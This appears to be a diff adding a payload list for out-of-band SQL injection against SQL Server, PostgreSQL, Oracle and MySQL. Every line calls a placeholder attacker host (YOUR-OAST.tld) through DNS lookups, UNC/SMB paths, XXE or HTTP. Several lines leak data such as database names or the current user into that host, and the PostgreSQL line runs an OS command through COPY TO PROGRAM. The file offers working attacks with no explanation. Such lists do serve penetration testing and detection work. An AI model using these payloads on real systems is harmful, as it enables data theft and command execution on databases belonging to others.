@@ -1,0 +1,14 @@
+# SQL Server (DNS/SMB via UNC)
+DECLARE @p varchar(128)=(SELECT TOP 1 name FROM sys.databases); EXEC('master..xp_dirtree "\\\\'+@p+'.YOUR-OAST.tld\\a"');
+
+# PostgreSQL
+COPY (SELECT current_user) TO PROGRAM 'nslookup YOUR-OAST.tld';
+
+# Oracle (XXE / UTL)
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://YOUR-OAST.tld/">%p;]>'),'/l') FROM dual;
+SELECT UTL_INADDR.get_host_address('YOUR-OAST.tld') FROM dual;
+
+# MySQL (Windows UNC)
+SELECT LOAD_FILE('\\\\YOUR-OAST.tld\\a');
+SELECT (SELECT user()) INTO OUTFILE '\\\\YOUR-OAST.tld\\a';
+
